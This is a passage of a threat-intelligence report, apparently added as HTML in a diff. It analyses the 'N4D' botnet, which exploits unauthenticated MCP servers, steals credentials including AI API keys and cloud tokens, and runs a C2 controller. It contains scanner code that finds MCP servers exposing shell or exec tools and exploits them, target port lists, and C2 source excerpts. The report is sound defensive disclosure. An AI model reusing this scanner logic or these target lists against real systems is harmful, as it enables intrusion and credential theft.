+    <p style="margin:12px 0;"><strong style="color:var(--blue);">3️⃣ Automated Exploit Chaining Engine</strong><br>
+    <code>pathing_engine.py</code> generates multi-step lateral movement automatically: scan → find service → execute → harvest credentials → deploy agent.
+    Each compromised host becomes a stepping stone, not a random victim. This is operational sophistication beyond simple worm-style propagation.</p>
+
+    <p style="margin:12px 0;"><strong style="color:var(--blue);">4️⃣ Defense-Aware Malware with AI System Recognition</strong><br>
+    The binary encodes explicit detection of "prompt injection defenses" as a security category.
+    This indicates the threat actor has encountered defended AI systems and is learning from them in real time.</p>
+  </div>
+
+  <p style="color:var(--text);font-size:0.95em;margin:16px 0 0 0;padding-top:16px;border-top:1px solid var(--border);">
+    <strong>Why This Matters:</strong> These capabilities exist separately in various families: LLM-assisted malware (PROMPTFLUX), AI-targeting exploits (ShadowRay), lateral movement engines (many botnets), and defense evasion (standard practice). N4D integrates all four in a C2-controlled botnet with tactical agent autonomy. This specific combination—generic MCP exploitation + AI targeting + automated planning + defense-awareness—defines N4D's operational posture.
+  </p>
+</div>
+
+<p>
+  Each of these four capabilities is detailed in the sections below. See Section 03 for MCP exploitation, Section 13 for AI platform targeting, and the binary analysis (Section 13) for the automated chaining and defense-awareness mechanics.
+</p>
+
+<div class="ai-callout">
+  <p>
+    <strong>AI operator priority:</strong> The harvest rules in <code>pathing_engine.py</code>
+    explicitly prioritize <code>OPENAI_API_KEY</code>, <code>ANTHROPIC_API_KEY</code>,
+    and AWS credentials above all other credential types. The binary analysis confirms
+    this is not incidental. <code>deployLightLLM</code>, <code>deployRayDashboard</code>,
+    and <code>exploitAKSMCP</code> are first-class exploit modules targeting the GPU
+    compute and model API access that represent directly monetizable assets.
+  </p>
+</div>
+
+<div class="callout-red">
+  <p>
+    <strong>Critical finding:</strong> The C2 API port 8443 was reachable during the investigation.
+    <code>GET /api/intel</code> on controller v3.1 required zero authentication:
+    no token, no key, no session. A single HTTP request returned every credential
+    the botnet had collected from its victims.
+  </p>
+</div>
+
+<p>
+  Following discovery of the exposure, the operators upgraded to controller v4.0.
+  The new version added HMAC-SHA256 authentication on all sensitive endpoints, CDN
+  camouflage via 302 redirect to Imperva, Cloudflare tunnel relay for agent
+  communications, and a multi-step attack chain engine (<code>pathing_engine.py</code>).
+  The full v3.1 to v4.0 transition is documented by files recovered from the open directory.
+</p>
+
+<p>The open directory contained, at minimum:</p>
+<ul>
+  <li>Four scanner generations: <code>mcp_scan.py</code>, <code>mcp_direct.py</code>, <code>mcp_scan_v2.py</code>, <code>mcp_v3.py</code></li>
+  <li>Polymorphic agent builder: <code>build_agent.py</code> + <code>mesh_agent.py</code></li>
+  <li>C2 controllers: <code>controller.py</code> (v3.1) and <code>controller_v4.py</code></li>
+  <li>AWS post-exploitation script: <code>aws_enum.py</code> + <code>aws_validated.json</code></li>
+  <li>Attack chain planner: <code>pathing_engine.py</code></li>
+  <li>Shell delivery script: <code>beacon.sh</code></li>
+</ul>
+
+<div class="fig-wrap">
+  <img src="img_arch.svg" width="100%" style="max-width:1200px; border:1px solid #21262d; border-radius:8px; margin:1.5rem 0;" alt="N4D campaign architecture overview">
+  <p class="fig-cap">Fig. 1 - High-level campaign architecture: C2 controller dispatching CIDR scan tasks to distributed agents, with the polymorphic build pipeline and credential exfiltration pipeline.</p>
+</div>
+
+
+<!-- Section 2: Infrastructure -->
+<h2 id="infrastructure">02. Infrastructure Architecture</h2>
+
+<p>
+  The C2 controller is a FastAPI application running under Uvicorn on port
+  <code>:8443</code>, backed by a PostgreSQL database with eight tables. The agent fleet
+  communicates with the controller over HMAC-authenticated HTTP in v4.0. A P2P mesh layer
+  on port <code>:9999</code> allows inter-agent communication and peer discovery,
+  providing operational continuity if the primary controller becomes unavailable.
+</p>
+
+<h3>Controller Database Schema</h3>
+
+<p>
+  PostgreSQL backs all controller state across eight tables:
+</p>
+
+<div class="tbl-wrap">
+<table>
+  <thead>
+    <tr><th>Table</th><th>Purpose</th><th>Key Columns</th></tr>
+  </thead>
+  <tbody>
+    <tr><td class="strong mono">nodes</td><td>Agent registry and heartbeat tracking</td><td class="mono">node_id, ip, tunnel_url, version, last_seen</td></tr>
+    <tr><td class="strong mono">tasks</td><td>Scan task queue dispatched to agents</td><td class="mono">task_id, node_id, cidr, ports, status</td></tr>
+    <tr><td class="strong mono">results</td><td>Raw scan output from completed tasks</td><td class="mono">task_id, findings, created_at</td></tr>
+    <tr><td class="strong mono">intel</td><td>Exfiltrated credentials and system files</td><td class="mono">node_id, files, env, docker, metadata</td></tr>
+    <tr><td class="strong mono">alerts</td><td>High-value target notifications</td><td class="mono">node_id, alert_type, detail</td></tr>
+    <tr><td class="strong mono">scanned_ranges</td><td>CIDR deduplication across the fleet</td><td class="mono">cidr, scanned_at, node_id</td></tr>
+    <tr><td class="strong mono">deploys</td><td>Beacon and deployment log</td><td class="mono">target_ip, target_port, status, deployed_by</td></tr>
+    <tr><td class="strong mono">chain_tasks</td><td>Multi-step attack chain assignments</td><td class="mono">chain, status, current_step, node_id</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h3>Geo-Targeted CIDR Assignment</h3>
+
+<p>
+  When an agent registers, the controller inspects the connecting IP and assigns scan
+  ranges from regionally appropriate CIDRs. Chinese IP addresses receive Tencent Cloud
+  and Alibaba Cloud ranges. All other IPs receive ranges from Hetzner, DigitalOcean,
+  Linode, OVH, Vultr, and Contabo. This approach distributes scan traffic across cloud
+  providers to avoid threshold-based blocking on any single ASN.
+</p>
+
+<h3>Cloudflare Tunnel Relay</h3>
+
+<p>
+  Each agent registers a Cloudflare tunnel URL via <code>POST /api/endpoint</code> on
+  first connection. Subsequent agent-to-C2 traffic flows through Cloudflare's infrastructure,
+  hiding the actual C2 IP from network-layer defenders inspecting agent traffic. The
+  controller resolves which Cloudflare URL belongs to which agent via the
+  <code>nodes.tunnel_url</code> column.
+</p>
+
+<h3>Three-Port Public Entry Stack</h3>
+
+<p>
+  Three separate listener processes bind the server's public interface, each proxying to
+  the same FastAPI backend on <code>:8443</code>. This gives agents and operators three
+  independent network paths to the C2, improving resilience against port-level blocking:
+</p>
+
+<div class="tbl-wrap">
+<table>
+  <thead>
+    <tr><th>Port</th><th>Script</th><th>Protocol</th><th>Function</th></tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td class="mono" style="color:var(--red)">:80</td>
+      <td class="mono">http_proxy.py</td>
+      <td>Plain HTTP</td>
+      <td>Forwards to <code>:8443</code>; used as third-priority fallback in <code>beacon.sh</code> when HTTPS is unavailable</td>
+    </tr>
+    <tr>
+      <td class="mono" style="color:var(--red)">:443</td>
+      <td class="mono">tls_proxy.py</td>
+      <td>TLS - <code>cdnorigin.net</code></td>
+      <td>Terminates TLS using the <code>cdnorigin.net</code> certificate, then proxies plaintext to <code>:8443</code>; primary secure entry</td>
+    </tr>
+    <tr>
+      <td class="mono" style="color:var(--red)">:8443</td>
+      <td class="mono">controller_v4.py</td>
+      <td>Plain HTTP (FastAPI)</td>
+      <td>Direct C2 API; all authenticated agent endpoints; the canonical backend for all three entry points</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<h3>CDN Front Domain - cdnorigin.net</h3>
+
+<p>
+  The TLS proxy on port 443 presents a certificate issued to <code>CN=cdnorigin.net</code>
+  - a domain registered specifically for this operation to add apparent legitimacy.
+  The certificate is self-signed with an RSA-2048 key pair and carries a 10-year validity
+  window (issued 2026-06-26, expires 2036-06-23). Agents using the curl download fallback
+  with <code>-k</code> skip certificate validation entirely, so the domain name serves
+  primarily to make TLS traffic appear to originate from a CDN origin rather than a raw IP.
+</p>
+
+<p>
+  The private key for this certificate (<code>cf-key.pem</code>) was present in the
+  exposed open directory and has been fully redacted from this report. Its exposure
+  means any observer of TLS traffic to port 443 can decrypt it retroactively.
+  See Section 14 for full OpSec failure analysis.
+</p>
+
+<div class="fig-wrap">
+  <img src="img_cdn_front.svg" width="100%" style="max-width:1200px; border:1px solid #21262d; border-radius:8px; margin:1.5rem 0;" alt="Three-port C2 entry stack and CDN front architecture">
+  <p class="fig-cap">Fig. 2 - The three-port C2 entry stack: <code>tls_proxy.py</code> on :443 (cdnorigin.net TLS, private key exposed), <code>http_proxy.py</code> on :80 (plain forward), and <code>controller_v4.py</code> on :8443 (direct FastAPI). All proxy to the same backend. Non-API requests receive a 302 redirect to imperva.com for CDN camouflage.</p>
+</div>
+
+
+<!-- Section 3: MCP -->
+<h2 id="mcp">03. Why AI Tooling Is the Target</h2>
+
+<p>
+  The Model Context Protocol (MCP) - specified at protocol version 2024-11-05 - is a
+  JSON-RPC standard that lets AI assistants communicate with external tool servers. An AI
+  assistant configured with an MCP server can call tools to run code, read files, query
+  databases, invoke cloud APIs, and more. The spec places no authentication requirement
+  at the transport layer. Server implementors are entirely responsible for access control.
+</p>
+
+<p>
+  In practice, thousands of MCP servers run on public IP addresses with no authentication.
+  Developers deploy them during experimentation; CI systems run them for automated
+  workflows; internal services expose them on ports that are inadvertently routed through
+  cloud security groups left at their defaults. The protocol's <code>tools/list</code>
+  method returns a machine-readable manifest of every capability a server has. This makes
+  automated target qualification trivial: connect, enumerate, classify, and call.
+</p>
+
+<div class="callout-red">
+  <p>
+    <strong>No exploit required.</strong> An MCP server advertising <code>execute_command</code>
+    without authentication is an unauthenticated root shell on the public internet.
+    The attacker sends a standard JSON-RPC <code>tools/call</code> request.
+    There is no vulnerability to patch. There is no CVE. The server performs exactly as
+    designed - it just had no business being reachable from the open internet.
+  </p>
+</div>
+
+<h3>Dangerous Tool Classifier</h3>
+
+<p>
+  Every probed server's tool list is matched against this classifier. A single match
+  triggers immediate exploitation via <code>tools/call</code>:
+</p>
+
+<div class="tool-grid">
+  <span class="tool t-danger">execute_command</span>
+  <span class="tool t-danger">run_command</span>
+  <span class="tool t-danger">shell</span>
+  <span class="tool t-danger">terminal</span>
+  <span class="tool t-danger">execute</span>
+  <span class="tool t-danger">eval</span>
+  <span class="tool t-danger">exec</span>
+  <span class="tool t-danger">subprocess</span>
+  <span class="tool t-danger">call_kubectl</span>
+  <span class="tool t-danger">call_az</span>
+  <span class="tool t-warn">read_file</span>
+  <span class="tool t-warn">write_file</span>
+  <span class="tool t-warn">delete_file</span>
+  <span class="tool t-warn">execute_sql</span>
+  <span class="tool t-warn">run_sql</span>
+  <span class="tool t-warn">read_query</span>
+  <span class="tool t-warn">transfer</span>
+  <span class="tool t-warn">withdraw</span>
+  <span class="tool t-warn">sign</span>
+  <span class="tool t-warn">deploy</span>
+  <span class="tool t-safe">command</span>
+  <span class="tool t-safe">query</span>
+</div>
+<p style="font-size:11px;color:var(--mute);margin-top:-8px;">
+  <span style="color:#fca5a5;">&#9632;</span> Direct unauthenticated RCE &nbsp;&nbsp;
+  <span style="color:#fdba74;">&#9632;</span> High-impact data / lateral movement &nbsp;&nbsp;
+  <span style="color:#86efac;">&#9632;</span> Context-dependent
+</p>
+
+<div class="fig-wrap">
+  <img src="img_mcp_exploit.svg" width="100%" style="max-width:1200px; border:1px solid #21262d; border-radius:8px; margin:1.5rem 0;" alt="MCP exploit sequence diagram">
+  <p class="fig-cap">Fig. 3 - The MCP exploit sequence: initialize handshake, tools/list reveals execute_command, a single tools/call delivers a command, response contains root shell output.</p>
+</div>
+
+
+<!-- Section 4: Scanning -->
+<h2 id="scanning">04. Scanning Operations</h2>
+
+<p>
+  Four scanner versions appear in the disclosed toolkit, each representing a development
+  iteration within the same operational window. File timestamps from the open directory
+  snapshot place these at least 9 hours apart, showing active tuning during live campaign
+  execution.
+</p>
+
+<div class="tbl-wrap">
+<table>
+  <thead>
+    <tr><th>Version</th><th>File</th><th>Concurrency</th><th>Key Change</th></tr>
+  </thead>
+  <tbody>
+    <tr><td class="pill p-dim">v1</td><td class="mono">mcp_scan.py</td><td>200 workers</td><td>Baseline - reads targets from stdin, single shared client</td></tr>
+    <tr><td class="pill p-dim">v2</td><td class="mono">mcp_direct.py</td><td>500 workers</td><td>CIDR input mode, 14-port target list</td></tr>
+    <tr><td class="pill p-dim">v3</td><td class="mono">mcp_scan_v2.py</td><td>500 workers</td><td>Shared AsyncClient across workers - major throughput improvement</td></tr>
+    <tr><td class="pill p-green">v4 (final)</td><td class="mono">mcp_v3.py</td><td>500 workers</td><td>Explicit connection pool limits, 30s pool timeout, JSONL output sorted by dangerous tool count</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h3>Final Scanner Core - MCP Handshake and Dangerous Tool Classification</h3>
+
+<pre><code><span class="cm"># mcp_v3.py - core scanner logic (abbreviated)</span>
+INIT = {
+    <span class="st">"jsonrpc"</span>: <span class="st">"2.0"</span>,
+    <span class="st">"id"</span>: <span class="blu">1</span>,
+    <span class="st">"method"</span>: <span class="st">"initialize"</span>,
+    <span class="st">"params"</span>: {
+        <span class="st">"protocolVersion"</span>: <span class="st">"2024-11-05"</span>,
+        <span class="st">"capabilities"</span>: {},
+        <span class="st">"clientInfo"</span>: {<span class="st">"name"</span>: <span class="st">"n4d-vps"</span>, <span class="st">"version"</span>: <span class="st">"1.0"</span>}
+    }
+}
+
+DANGER = {
+    <span class="st">"execute_command"</span>, <span class="st">"run_command"</span>, <span class="st">"execute"</span>, <span class="st">"shell"</span>, <span class="st">"terminal"</span>,
+    <span class="st">"read_file"</span>, <span class="st">"write_file"</span>, <span class="st">"delete_file"</span>, <span class="st">"execute_sql"</span>, <span class="st">"run_sql"</span>,
+    <span class="st">"read_query"</span>, <span class="st">"call_kubectl"</span>, <span class="st">"call_az"</span>, <span class="st">"eval"</span>, <span class="st">"exec"</span>,
+    <span class="st">"subprocess"</span>, <span class="st">"command"</span>, <span class="st">"transfer"</span>, <span class="st">"withdraw"</span>, <span class="st">"sign"</span>, <span class="st">"deploy"</span>
+}
+
+<span class="kw">async def</span> <span class="fn">probe_mcp</span>(client, ip, port, path):
+    url = <span class="fn">f</span><span class="st">"http://{ip}:{port}{path}"</span>
+    r = <span class="kw">await</span> client.<span class="fn">post</span>(url, json=INIT, timeout=<span class="blu">4</span>)
+    <span class="kw">if</span> r.status_code == <span class="blu">200</span> <span class="kw">and</span> <span class="st">"result"</span> <span class="kw">in</span> r.<span class="fn">json</span>():
+        tools = <span class="kw">await</span> <span class="fn">list_tools</span>(client, url)
+        dangerous = [t <span class="kw">for</span> t <span class="kw">in</span> tools <span class="kw">if</span> <span class="fn">any</span>(d <span class="kw">in</span> t.<span class="fn">lower</span>() <span class="kw">for</span> d <span class="kw">in</span> DANGER)]
+        <span class="kw">if</span> dangerous:
+            <span class="kw">await</span> <span class="fn">exploit_dangerous</span>(client, url, dangerous)</code></pre>
+
+<h3>v4.0 Port Expansion</h3>
+
+<p>
+  Controller v4.0 doubles the port scope from 8 to 16 targets per host, adding
+  infrastructure management surfaces that go far beyond MCP:
+</p>
+
+<pre><code><span class="cm"># v3.1 - 8 ports</span>
+SCAN_PORTS = <span class="st">"80,443,3000,5000,8000,8080,8443,8888"</span>
+
+<span class="cm"># v4.0 - 16 ports: added Docker, Kubernetes, Redis, PostgreSQL, Elasticsearch</span>
+SCAN_PORTS = <span class="st">"80,443,3000,5000,8000,8080,8443,8888,2375,2376,6379,5432,6443,10250,9090,9200"</span></code></pre>
+
+<p>
+  Docker daemon on <code>:2375</code> (unauthenticated by default), the Kubernetes API
+  on <code>:6443</code>, kubelet on <code>:10250</code>, and Redis on <code>:6379</code>
+  are each independently capable of yielding full cluster control with no credentials.
+  The operation expanded its target surface from "exposed AI tool endpoints" to "any
+  exposed infrastructure management interface."
+</p>
+
+<div class="fig-wrap">
+  <img src="img_timeline.svg" width="100%" style="max-width:1200px; border:1px solid #21262d; border-radius:8px; margin:1.5rem 0;" alt="Operation timeline">
+  <p class="fig-cap">Fig. 4 - Operation timeline - 9+ hours of continuous scanning documented from the open directory snapshot, showing scanner iterations and operational evolution.</p>
+</div>
+
+
+<!-- Section 5: Intel API -->
+<h2 id="intel-api">05. Critical OpSec Failure: Unauthenticated Intel API</h2>
+
+<p>
+  The most consequential finding in this investigation is not what the botnet did to its
+  victims. It is what the operators left exposed about themselves. The C2 API on port 8443
+  was reachable. In controller v3.1, the credential endpoint required no authentication
+  whatsoever. A direct HTTP request returned the complete harvest database.
+</p>
+
+<h3>The Unauthenticated Endpoint - v3.1 Source</h3>
+
+<pre><code><span class="cm"># controller.py (v3.1) - THE EXPOSED VERSION</span>
+<span class="hl">@app.get(<span class="st">"/api/intel"</span>)</span>
+<span class="kw">async def</span> <span class="fn">get_intel</span>():
+    <span class="kw">with</span> <span class="fn">db</span>() <span class="kw">as</span> c:
+        cur = c.<span class="fn">cursor</span>()
+        cur.<span class="fn">execute</span>(
+            <span class="st">"SELECT node_id, files, env, docker, metadata, created_at "</span>
+            <span class="st">"FROM intel ORDER BY created_at DESC LIMIT 50"</span>
+        )
+        cols = [d[<span class="blu">0</span>] <span class="kw">for</span> d <span class="kw">in</span> cur.description]
+        <span class="kw">return</span> {<span class="st">"intel"</span>: [<span class="fn">dict</span>(<span class="fn">zip</span>(cols, row)) <span class="kw">for</span> row <span class="kw">in</span> cur.<span class="fn">fetchall</span>()]}</code></pre>
+
+<div class="callout-red">
+  <p>
+    No authentication decorator. No middleware. No API key check. Anyone who could reach
+    port 8443 could dump every credential the botnet had ever collected.
+    This endpoint produced the credential dataset analyzed in §06.
+  </p>
+</div>
+
+<h3>The POST Endpoint Was Equally Open</h3>
+
+<p>
+  The intel submission endpoint, the one agents call to exfiltrate credentials,
+  was also unauthenticated in v3.1. Any host on the internet could submit arbitrary
+  credential data to the botnet's database. Any host could also read back everything
+  submitted. The entire intel pipeline was unauthenticated.
+</p>
+
+<div class="fig-wrap">
+  <img src="img_api_exposure.svg" width="100%" style="max-width:1200px; border:1px solid #21262d; border-radius:8px; margin:1.5rem 0;" alt="API exposure diagram">
+  <p class="fig-cap">Fig. 5 - The unauthenticated /api/intel endpoint in v3.1: both GET (credential dump) and POST (credential submission) required no authentication token of any kind.</p>
+</div>
+
+
+<!-- Section 6: Credentials -->
+<h2 id="credentials">06. Credential Harvest: Contents of GET /api/intel</h2>
+
+<p>
+  The intel API response is a JSON array. Each record represents one compromised host
+  and the material submitted by that host's agent. All actual values in this report are
+  replaced with <code>[REDACTED]</code>. The following describes the structure and types
+  of data present.
+</p>
+
+<div class="callout-red" style="margin-bottom:1.5rem;">
+  <strong>First-Wave Harvest Results</strong> — credential and access types recovered from the initial exploitation wave:
+  <div style="display:flex;flex-wrap:wrap;gap:0.6rem 1.4rem;margin-top:0.7rem;font-size:0.82rem;">
+    <span><strong style="color:var(--red);">46</strong> <code>/etc/shadow</code> files</span>
+    <span><strong style="color:var(--red);">21</strong> backdoored <code>authorized_keys</code></span>
+    <span><strong style="color:var(--red);">6</strong> SSH private keys</span>
+    <span><strong style="color:var(--orange);">5</strong> Azure ARM bearer tokens</span>
+    <span><strong style="color:var(--orange);">6</strong> AWS IAM sets (3 accounts)</span>
+    <span><strong style="color:var(--orange);">18</strong> Docker socket paths</span>
+    <span><strong style="color:var(--yellow);">9</strong> env var secrets</span>
+  </div>
+</div>
+
+<h3>System Credentials - files Field</h3>
+
+<p>
+  Each record's <code>files</code> field is a dictionary mapping file paths to their
+  verbatim contents as exfiltrated from the compromised host:
+</p>
+
+<div class="tbl-wrap">
+<table>
+  <thead>
+    <tr><th>File Path</th><th>Content Type</th><th>Hash Format</th><th>Status</th></tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td class="mono">/etc/shadow</td>
+      <td>Linux shadow password database</td>
+      <td class="mono">$y$ (yescrypt), $6$ (SHA-512)</td>
+      <td><span class="pill p-red">[REDACTED]</span></td>
+    </tr>
+    <tr>
+      <td class="mono">/root/.ssh/id_rsa</td>
+      <td>RSA private key (PEM format)</td>
+      <td class="mono">-----BEGIN RSA PRIVATE KEY-----</td>
+      <td><span class="pill p-red">[REDACTED]</span></td>
+    </tr>
+    <tr>
+      <td class="mono">/root/.ssh/authorized_keys</td>
+      <td>Attacker-inserted backdoor public key</td>
+      <td>Comment field: <code>test</code></td>
+      <td><span class="pill p-red">[REDACTED]</span></td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<p>
+  The intel database contains <strong>100 total records</strong>, of which 98 carry substantive
+  data. Credential type distribution across the dataset:
+</p>
+
+<div class="tbl-wrap">
+<table>
+  <thead>
+    <tr><th>Credential / Data Type</th><th>Records</th><th>Notes</th></tr>
+  </thead>
+  <tbody>
+    <tr><td><code>/etc/shadow</code> captured</td><td>46</td><td>15 with root password hash; 31 with root locked</td></tr>
+    <tr><td><code>authorized_keys</code> modified</td><td>21</td><td>Backdoor key inserted; see key comment breakdown below</td></tr>
+    <tr><td>Nodes with Docker present</td><td>18</td><td>Enables container escape paths</td></tr>
+    <tr><td>Azure Managed Identity tokens</td><td>5</td><td>Azure RM Bearer tokens from IMDS (<code>169.254.169.254</code>)</td></tr>
+    <tr><td>SSH private keys (<code>/root/.ssh/id_rsa</code>)</td><td>6</td><td>[REDACTED]</td></tr>
+    <tr><td>Environment variables with secrets</td><td>9</td><td>Includes <code>NGINX_UI_PREDEFINED_USER_PASSWORD</code>, <code>MYSQL_ROOT_PASSWORD</code>, <code>UPDATE_SERVICE_API_KEY</code></td></tr>
+    <tr><td>AWS IAM credential sets (aws_validated.json)</td><td>6</td><td>3 distinct AWS accounts; validated live via STS GetCallerIdentity by aws_enum.py</td></tr>
+  </tbody>
+</table>
+</div>
+
+<p>
+  The backdoor SSH key in <code>authorized_keys</code> is not a single key — the agent inserts
+  keys from a pool with nine distinct comment strings across the 21 backdoored hosts:
+</p>
+
+<div class="tbl-wrap">
+<table>
+  <thead>
+    <tr><th>Key Comment</th><th>Count</th><th>Assessment</th></tr>
+  </thead>
+  <tbody>
+    <tr><td class="mono">auto-backdoor</td><td>21</td><td>Agent-generated key — automated, campaign-wide</td></tr>
+    <tr><td class="mono">test</td><td>6</td><td>Generic operator key</td></tr>
+    <tr><td class="mono">u0_a599@localhost</td><td>3</td><td>Android app UID format — suggests connection from Android (Termux or similar)</td></tr>
+    <tr><td class="mono">admin@mm</td><td>2</td><td>Short generic hostname</td></tr>
+    <tr><td class="mono">hype</td><td>2</td><td>Operator handle or generic label</td></tr>
+    <tr><td class="mono">jan@mac</td><td>1</td><td><em>Low-confidence attribution indicator</em> — personal Mac username</td></tr>
+    <tr><td class="mono">root@proxmox</td><td>1</td><td>Proxmox host — likely compromised relay node</td></tr>
+    <tr><td class="mono">good@gooddeMacBook-Pro.local</td><td>1</td><td><em>Low-confidence attribution indicator</em> — personal Mac with operator username <code>good</code></td></tr>
+    <tr><td class="mono">evincent@ev-mac.lan</td><td>1</td><td><em>Low-confidence attribution indicator</em> — Mac on private LAN; username <code>evincent</code> also appears in one captured <code>/etc/shadow</code></td></tr>
+    <tr><td>(no comment)</td><td>1</td><td>—</td></tr>
+  </tbody>
+</table>
+</div>
+
+
+<h3>Cloud Credentials - metadata Field</h3>
+
+<p>
+  The <code>metadata</code> field contains JSON where each key is the name of an MCP
+  tool that the agent called, and the value is the verbatim JSON response that tool
+  returned. This directly maps MCP tool exploitation to credential type:
+</p>
+
+<div class="tbl-wrap">
+<table>
+  <thead>
+    <tr><th>MCP Tool Called</th><th>Credential Type</th><th>Example Fields</th><th>Value</th></tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td class="mono">get_aws_admin_credentials</td>
+      <td>AWS long-term IAM key</td>
+      <td class="mono">AccessKeyId, SecretAccessKey</td>
+      <td><span class="pill p-red">[REDACTED]</span></td>
+    </tr>
+    <tr>
+      <td class="mono">get_aws_session_credentials</td>
+      <td>AWS STS temporary token</td>
+      <td class="mono">AccessKeyId (ASIA...), SecretAccessKey, SessionToken</td>
+      <td><span class="pill p-red">[REDACTED]</span></td>
+    </tr>
+    <tr>
+      <td class="mono">get_ssh_session_credentials</td>
+      <td>EC2 SSH plaintext password</td>
+      <td class="mono">username: ec2-user, password</td>
+      <td><span class="pill p-red">[REDACTED]</span></td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<h3>Azure Managed Identity Tokens</h3>
+
+<p>
+  Several records contain full Azure Resource Manager Bearer tokens obtained from the
+  Azure Instance Metadata Service (IMDS) at <code>169.254.169.254</code>. The decoded JWT
+  claims identify the source VM precisely:
+</p>
+
+<div class="tbl-wrap">
+<table>
+  <thead>
+    <tr><th>JWT Claim</th><th>Value</th><th>Implication</th></tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td class="mono">aud</td>
+      <td class="mono">https://management.azure.com/</td>
+      <td>Full Azure Resource Manager scope</td>
+    </tr>
+    <tr>
+      <td class="mono">idtyp</td>
+      <td class="mono">app</td>
+      <td>Machine identity (Managed Identity), not a user token</td>
+    </tr>
+    <tr>
+      <td class="mono">xms_mirid</td>
+      <td class="mono">/subscriptions/[REDACTED]/resourceGroups/[REDACTED]/providers/Microsoft.Compute/virtualMachines/[REDACTED]</td>
+      <td>Exact source VM path fully identified</td>
+    </tr>
+    <tr>
+      <td class="mono">exp</td>
+      <td class="mono">iat + 24h</td>
+      <td>Token valid 24 hours; three successive entries ~10h apart indicate auto-refresh by agent</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<p>
+  Three JWT entries for the same node appear with issue times roughly 10 hours apart.
+  The agent refreshes the token before its 24-hour expiry, maintaining persistent
+  Azure management plane access without any additional exploitation step.
+</p>
+
+<p>
+  Six AWS credential records across three distinct AWS accounts appear in
+  <code>aws_validated.json</code> (validated separately from the intel API via
+  <code>aws_enum.py</code>, confirmed live via STS <code>GetCallerIdentity</code>).
+  IAM usernames present: <code>admin-old</code>, <code>svc-backup</code>,
+  <code>svc-ansible</code>, <code>payroll-svc</code>, <code>legacy-service</code>.
+  All credential values are <strong>[REDACTED]</strong>. Source IPs correspond to
+  cloud VMs (previously compromised MCP servers) and are likewise redacted.
+  Note: the intel API metadata field stores Azure tokens directly; AWS credentials
+  were harvested via a separate validation pipeline rather than via MCP tool calls.
+</p>
+
+<div class="fig-wrap">
+  <img src="img_intel.svg" width="100%" style="max-width:1200px; border:1px solid #21262d; border-radius:8px; margin:1.5rem 0;" alt="Credential harvest diagram">
+  <p class="fig-cap">Fig. 6 - Intel API record structure: the chain from MCP tool call to credential type stored in the intel database.</p>
+</div>
+
+
+<!-- Section 7: Evolution -->
+<h2 id="evolution">07. v3.1 to v4.0 Hardening: An Operational Response</h2>
+
+<p>
+  Controller v4.0 is not a routine feature release. Every substantive change it introduces
+  directly addresses the specific failure that led to the credential database exposure.
+  The diff between the two controllers, both present in the open directory, reads as a
+  forensic record of what the operators realized they had done wrong.
+</p>
+
+<h3>HMAC Authentication Added</h3>
+
+<pre><code><span class="cm"># controller_v4.py - lines 53-70</span>
+MESH_KEY = <span class="fn">bytes.fromhex</span>(<span class="st">"[REDACTED - 32-byte HMAC key]"</span>)
+OPERATOR_KEY = os.environ.<span class="fn">get</span>(<span class="st">"N4D_OP_KEY"</span>, <span class="st">"[REDACTED]"</span>)
+
+<span class="kw">def</span> <span class="fn">verify_bot_auth</span>(req: Request) -> bool:
+    <span class="st">"""Verify HMAC-SHA256(mesh_key, node_id + timestamp) in X-Mesh-Auth header."""</span>
+    token = req.headers.<span class="fn">get</span>(<span class="st">"X-Mesh-Auth"</span>, <span class="st">""</span>)
+    <span class="kw">if not</span> token <span class="kw">or</span> <span class="st">":"</span> <span class="kw">not in</span> token:
+        <span class="kw">return</span> <span class="blu">False</span>
+    nid, sig_hex = token.<span class="fn">split</span>(<span class="st">":"</span>, <span class="blu">1</span>)
+    <span class="cm"># Accept +-1 second window - bot generates HMAC at request time</span>
+    now = <span class="fn">int</span>(time.<span class="fn">time</span>())
+    <span class="kw">for</span> ts <span class="kw">in</span> [now, now - <span class="blu">1</span>, now + <span class="blu">1</span>]:
+        expected = hmac.<span class="fn">new</span>(
+            MESH_KEY,
+            <span class="fn">f</span><span class="st">"{nid}:{ts}"</span>.<span class="fn">encode</span>(),
+            hashlib.sha256
+        ).<span class="fn">hexdigest</span>()
+        <span class="kw">if</span> hmac.<span class="fn">compare_digest</span>(expected, sig_hex):
+            <span class="kw">return</span> <span class="blu">True</span>
+    <span class="kw">return</span> <span class="blu">False</span></code></pre>
+
+<h3>Authentication Middleware</h3>
+
+<pre><code><span class="cm"># controller_v4.py - lines 82-107</span>
+OPEN_ENDPOINTS = {
+    <span class="st">"/api/client/update"</span>, <span class="st">"/api/status"</span>, <span class="st">"/api/agent/binary"</span>,
+    <span class="st">"/api/register"</span>, <span class="st">"/api/agent/download"</span>, <span class="st">"/api/beacon"</span>,
+    <span class="st">"/api/update/check"</span>, <span class="st">"/api/update/canary"</span>, <span class="st">"/api/update/health"</span>
+}
+<span class="cm"># /api/intel, /api/chains, /api/stats require operator key</span>
+OPERATOR_ENDPOINTS = {<span class="st">"/api/intel"</span>, <span class="st">"/api/chains"</span>, <span class="st">"/api/stats"</span>}
+
+<span class="hl">@app.middleware(<span class="st">"http"</span>)</span>
+<span class="kw">async def</span> <span class="fn">auth_middleware</span>(req: Request, call_next):
+    path = req.url.path
+    <span class="kw">if not</span> path.<span class="fn">startswith</span>(<span class="st">"/api/"</span>):
+        <span class="kw">return await</span> <span class="fn">call_next</span>(req)
+    <span class="kw">if</span> path <span class="kw">in</span> OPEN_ENDPOINTS:
+        <span class="kw">return await</span> <span class="fn">call_next</span>(req)
+    <span class="kw">if</span> path <span class="kw">in</span> OPERATOR_ENDPOINTS <span class="kw">and</span> req.method == <span class="st">"GET"</span>:
+        <span class="kw">if</span> <span class="fn">verify_operator_auth</span>(req):
+            <span class="kw">return await</span> <span class="fn">call_next</span>(req)
+        <span class="kw">return</span> <span class="fn">JSONResponse</span>({<span class="st">"error"</span>: <span class="st">"unauthorized"</span>}, status_code=<span class="blu">401</span>)
